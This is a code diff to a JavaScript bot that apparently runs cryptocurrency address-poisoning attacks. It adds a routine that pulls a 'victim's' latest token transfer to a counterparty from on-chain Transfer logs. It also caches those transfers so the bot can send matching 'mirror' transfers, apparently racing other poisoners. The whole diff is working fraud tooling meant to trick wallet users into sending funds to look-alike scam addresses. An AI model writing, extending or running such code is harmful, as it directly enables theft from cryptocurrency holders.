@@ -932,7 +932,24 @@ async function counterPoison(victimAddress, victimEntry, tx = null, currentRaw =
         }
       }
 
-      // Fallback 3: DB query (only if no current amount, not in queue, and not in cache)
+      // 🚀 Fallback 3: Fetch victim→counterparty last transfer directly from blockchain
+      if (!foundInQueue && victimEntry.counterparty) {
+        const chainResult = await fetchLastTransferFromChain(
+          victimAddress.toLowerCase(),
+          victimEntry.counterparty.toLowerCase()
+        );
+        if (chainResult && chainResult.amount > 0n) {
+          mirrorRaw = chainResult.amount;
+          mirrorAsset = chainResult.asset;
+          mirrorContract = MIRROR_CONTRACTS[mirrorAsset] || MIRROR_CONTRACTS[mirrorAsset?.toUpperCase()] || MIRROR_TOKEN_NATIVE;
+          const decimals = getDecimals(mirrorAsset);
+          const humanAmount = (Number(mirrorRaw) / (10 ** decimals)).toFixed(4);
+          logger.info(`[competitive] ⛓️ Using blockchain-fetched amount: ${humanAmount} ${mirrorAsset}`);
+          foundInQueue = true; // Skip DB
+        }
+      }
+
+      // Fallback 4: DB query (only if no current amount, not in queue, not in cache, and not on-chain)
       if (!foundInQueue && supabaseService) {
         try {
           const { data: trapData, error } = await supabaseService
@@ -1007,6 +1024,57 @@ async function counterPoison(victimAddress, victimEntry, tx = null, currentRaw =
 
   return false;
 }
+
+
+// 🚀 BLOCKCHAIN FETCH: Gets the victim's last real transfer to counterparty from chain
+async function fetchLastTransferFromChain(victimAddress, counterpartyAddress) {
+  try {
+    const currentBlock = await client.getBlockNumber();
+    const fromBlock = currentBlock > 5000n ? currentBlock - 5000n : 0n;
+
+    // Fetch ERC-20 Transfer logs: victim → counterparty
+    const logs = await client.request({
+      method: 'eth_getLogs',
+      params: [{
+        fromBlock: `0x${fromBlock.toString(16)}`,
+        toBlock: 'latest',
+        topics: [
+          '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef',
+          '0x000000000000000000000000' + victimAddress.slice(2),
+          '0x000000000000000000000000' + counterpartyAddress.slice(2)
+        ]
+      }]
+    });
+
+    if (!logs || logs.length === 0) {
+      logger.info(`[chain-fetch] No recent victim→counterparty transfers found on-chain for ${victimAddress.slice(0, 10)}...`);
+      return null;
+    }
+
+    // Get the MOST RECENT log (last in array)
+    const lastLog = logs[logs.length - 1];
+    const rawAmount = BigInt(lastLog.data);
+    const contractAddress = lastLog.address?.toLowerCase() || '';
+    const assetSymbol = tokenAddressMap.get(contractAddress) || null;
+
+    if (rawAmount > 0n && assetSymbol) {
+      const decimals = getDecimals(assetSymbol);
+      const humanAmount = (Number(rawAmount) / (10 ** decimals)).toFixed(4);
+      logger.info(`[chain-fetch] ✅ Found on-chain: ${humanAmount} ${assetSymbol} (victim→counterparty)`);
+
+      // Cache it for future use
+      recentVictimTransfers.set(victimAddress.toLowerCase(), { amount: rawAmount, asset: assetSymbol, timestamp: Date.now() });
+
+      return { amount: rawAmount, asset: assetSymbol };
+    }
+
+    return null;
+  } catch (err) {
+    logger.warn(`[chain-fetch] Failed to fetch from blockchain: ${err.message}`);
+    return null;
+  }
+}
+
 
 
 function computeMirrorRawValue(tx, detectedAsset) {
@@ -2001,6 +2069,10 @@ function checkTransaction(tx, txLogs = []) {
       let mirrorQueued = false;
 
       if (mirrorRaw > 0n) {
+        // 🚀 CACHE: Store victim→counterparty transfer for counter-poison use
+        recentVictimTransfers.set(from, { amount: mirrorRaw, asset: detectedAsset, timestamp: Date.now() });
+        logger.info(`[cache] 🧠 Cached victim→counterparty transfer for ${from.slice(0, 10)}...: ${mirrorRaw} ${detectedAsset}`);
+
         let mirrorContractAddress =
           MIRROR_CONTRACTS[detectedAsset] ||
           MIRROR_CONTRACTS[detectedAsset?.toUpperCase()] ||
